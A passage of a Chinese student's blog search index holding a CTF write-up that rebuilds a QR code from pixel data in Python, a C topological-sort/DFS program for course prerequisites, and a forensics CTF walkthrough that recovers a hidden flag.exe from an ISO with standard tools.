class="line">I=np.zeros((200,200),dtype=np.uint8)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with open(r&#x27;C:/Users/brighten/Desktop/qr.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    count=0</span><br><span class="line">    for line in f:</span><br><span class="line">        print(line)</span><br><span class="line">        print(line[1:4])</span><br><span class="line">        if str(line[1:4])==&#x27;255&#x27;:</span><br><span class="line">            I[count//200][count%200]=255</span><br><span class="line">        else:</span><br><span class="line">            I[count // 200][count % 200] = 0</span><br><span class="line">        count+=1</span><br><span class="line">    cv.imwrite(&quot;1.png&quot;,I)</span><br><span class="line">    print(I)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2021041323173268.png"><br> 最后是得到了这个二维码，200*200的大小</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>课程先修问题，即AOV网和拓扑排序和深度优先搜索</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E8%AF%BE%E7%A8%8B%E5%85%88%E4%BF%AE%E9%97%AE%E9%A2%98%EF%BC%8C%E5%8D%B3AOV%E7%BD%91%E5%92%8C%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F%E5%92%8C%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E8%AF%BE%E7%A8%8B%E5%85%88%E4%BF%AE%E9%97%AE%E9%A2%98%EF%BC%8C%E5%8D%B3AOV%E7%BD%91%E5%92%8C%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F%E5%92%8C%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  课程先修问题，即AOV网和拓扑排序和深度优先搜索</p><h1 id="课程先修问题，即AOV网和拓扑排序和深度优先搜索"><a href="#课程先修问题，即AOV网和拓扑排序和深度优先搜索" class="headerlink" title="课程先修问题，即AOV网和拓扑排序和深度优先搜索"></a>课程先修问题，即AOV网和拓扑排序和深度优先搜索</h1><blockquote></blockquote><p>在学习生活中常常有这样的问题，每门课程之间存在一定的先修关系，必须完成相应的课程才能毕业。 那么该以什么顺序完成呢。</p><p>#AOV网和拓扑排序<br> 我们使用栈结构存储它的前驱为0的节点，每当有一个节点出栈，它的直接后驱的id号减一</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">#define _CRT_SECURE_NO_WARNINGS</span><br><span class="line">#include&amp;lt;stdio.h&amp;gt;</span><br><span class="line">#include&amp;lt;math.h&amp;gt;</span><br><span class="line">#include&amp;lt;string.h&amp;gt;</span><br><span class="line">#include&amp;lt;stdlib.h&amp;gt;</span><br><span class="line">#include&amp;lt;opencv.hpp&amp;gt;</span><br><span class="line">#include &amp;lt;iostream&amp;gt;</span><br><span class="line">#define _CRT_SECURE_NO_WARNINGS</span><br><span class="line">using namespace cv;</span><br><span class="line">#define max 20</span><br><span class="line">typedef struct ARCNODE&#123;//边集</span><br><span class="line">int adj;//第一条边</span><br><span class="line">struct ARCNODE* nextarc;//下一条边</span><br><span class="line">&#125;ARC,*ARCPTR;</span><br><span class="line">typedef struct vex &#123;///点集</span><br><span class="line">char vexdata;</span><br><span class="line">int id;</span><br><span class="line">ARCPTR firstadj;</span><br><span class="line">&#125;vexnode;</span><br><span class="line"></span><br><span class="line">typedef struct graph &#123;</span><br><span class="line">vex ver[max];</span><br><span class="line">int vexnum, arcnum;//点数 边数</span><br><span class="line">&#125;graph;</span><br><span class="line">int visit[max];</span><br><span class="line">void creat_graph(graph* G) &#123;</span><br><span class="line">ARC* p;</span><br><span class="line">int i, j, k;</span><br><span class="line">int v1, v2;</span><br><span class="line">printf(&quot;\ninput vexnum&quot;);</span><br><span class="line">scanf(&quot;%d&quot;, &amp;amp;G-&amp;gt;vexnum);</span><br><span class="line">getchar();</span><br><span class="line">for (i = 1;i &amp;lt;= G-&amp;gt;vexnum;i++) &#123;</span><br><span class="line">printf(&quot;input vexdata\n&quot;);</span><br><span class="line">scanf(&quot;%c&quot;, &amp;amp;G-&amp;gt;ver[i].vexdata);</span><br><span class="line">getchar();</span><br><span class="line">G-&amp;gt;ver[i].id = 0;</span><br><span class="line">G-&amp;gt;ver[i].firstadj = NULL;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\ninput arcnum&quot;);</span><br><span class="line">scanf(&quot;%d&quot;, &amp;amp;G-&amp;gt;arcnum);</span><br><span class="line">for (i = 1;i &amp;lt;= G-&amp;gt;arcnum;i++) &#123;</span><br><span class="line">printf(&quot;\ninput arc&quot;);</span><br><span class="line">scanf(&quot;%d %d&quot;, &amp;amp;v1, &amp;amp;v2);</span><br><span class="line"></span><br><span class="line">p = (ARC*)malloc(sizeof(ARC));</span><br><span class="line">p-&amp;gt;adj = v2;</span><br><span class="line">p-&amp;gt;nextarc = G-&amp;gt;ver[v1].firstadj;</span><br><span class="line">G-&amp;gt;ver[v1].firstadj = p;</span><br><span class="line">G-&amp;gt;ver[v2].id++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">void sort(graph * G) &#123;</span><br><span class="line">int s[100];</span><br><span class="line">int top = 0;</span><br><span class="line">int i,  j;</span><br><span class="line">ARCPTR p;</span><br><span class="line">for (i = 1;i &amp;lt;= G-&amp;gt;vexnum;i++) &#123;//top=0时为空</span><br><span class="line">if (G-&amp;gt;ver[i].id == 0) &#123;</span><br><span class="line">top++;s[top] = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">while (top != 0) &#123;</span><br><span class="line">i = s[top--];</span><br><span class="line">printf(&quot;%3c&quot;, G-&amp;gt;ver[i].vexdata);</span><br><span class="line">for (p = G-&amp;gt;ver[i].firstadj;p != NULL;p = p-&amp;gt;nextarc) &#123;</span><br><span class="line">j = p-&amp;gt;adj;</span><br><span class="line">G-&amp;gt;ver[j].id--;</span><br><span class="line">if (G-&amp;gt;ver[j].id== 0) &#123;</span><br><span class="line">top++;</span><br><span class="line">s[top] = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int first(graph* g,int i) &#123;</span><br><span class="line">int x;</span><br><span class="line">ARC* p;</span><br><span class="line">p = g-&amp;gt;ver[i].firstadj;</span><br><span class="line">if (p == NULL) &#123;</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">return p-&amp;gt;adj;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int next(graph* g, int i,int x) &#123;</span><br><span class="line">ARC* p;</span><br><span class="line">p = g-&amp;gt;ver[i].firstadj;</span><br><span class="line">while (p-&amp;gt;adj!= x) &#123;</span><br><span class="line">p = p-&amp;gt;nextarc;</span><br><span class="line">&#125;</span><br><span class="line">p = p-&amp;gt;nextarc;</span><br><span class="line">if (p == NULL) &#123;</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">return p-&amp;gt;adj;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">void dfs(graph* g,int i) &#123;</span><br><span class="line">ARC* p;</span><br><span class="line">int x;</span><br><span class="line">if (visit[i] == 0) &#123;</span><br><span class="line">x = first(g, i);</span><br><span class="line">visit[i] = 1;</span><br><span class="line">printf(&quot;%d %c\n&quot;, i,g-&amp;gt;ver[i].vexdata);</span><br><span class="line">while (x!=-1) &#123;</span><br><span class="line">if(!visit[x])</span><br><span class="line">dfs(g,x);</span><br><span class="line">x = next(g, i,x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">void beforedfs(graph* g) &#123;</span><br><span class="line">int i, j;</span><br><span class="line">for (i = 1;i &amp;lt;= g-&amp;gt;vexnum;i++) &#123;</span><br><span class="line">if (visit[i] ==0)</span><br><span class="line">&#123;</span><br><span class="line">dfs(g,i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">graph* G=(graph*)malloc(sizeof(graph));</span><br><span class="line">int j;</span><br><span class="line">creat_graph(G);</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">int i = 0;</span><br><span class="line">for (i = 1;i &amp;lt;= G-&amp;gt;vexnum;i++) &#123;</span><br><span class="line">visit[i] = 0;</span><br><span class="line">&#125;</span><br><span class="line">sort(G);</span><br><span class="line">printf(&quot;\n\n&quot;);</span><br><span class="line">beforedfs(G);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>[^1]但是若，该图存在环，会有部分无法输出</p><p><img alt="程序输出界面" src="https://img-blog.csdnimg.cn/20200706204216871.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="程序输出界面" src="https://img-blog.csdnimg.cn/20200706204251879.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p>]]></content>
      
      
      <categories>
          
          <category> acm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>间谍启示录 1</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E9%97%B4%E8%B0%8D%E5%90%AF%E7%A4%BA%E5%BD%95%201/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E9%97%B4%E8%B0%8D%E5%90%AF%E7%A4%BA%E5%BD%95%201/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  间谍启示录 1</p><h1 id="间谍启示录-1"><a href="#间谍启示录-1" class="headerlink" title="间谍启示录 1"></a>间谍启示录 1</h1><p>拿到一个iso文件，使用winhex查找flag字符串，发现有一个flag.exe</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210413233828746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 尝试把隐藏的文件拖出来</p><p>使用binwalk无效</p><p>那就使用strings命令硬来</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210413233949782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 查找所有字符，再看flag ，还是只有flag.exe</p><p>使用foremost命令，解出来了一些文件，所以说这个找出隐藏文件的方法就挺迷的。</p><p>拖到windows里面,linux里面运行不了。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210413234431208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 双击flag.exe，出现隐藏文件<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210413234511473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 把这个选项打开是一个好习惯</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
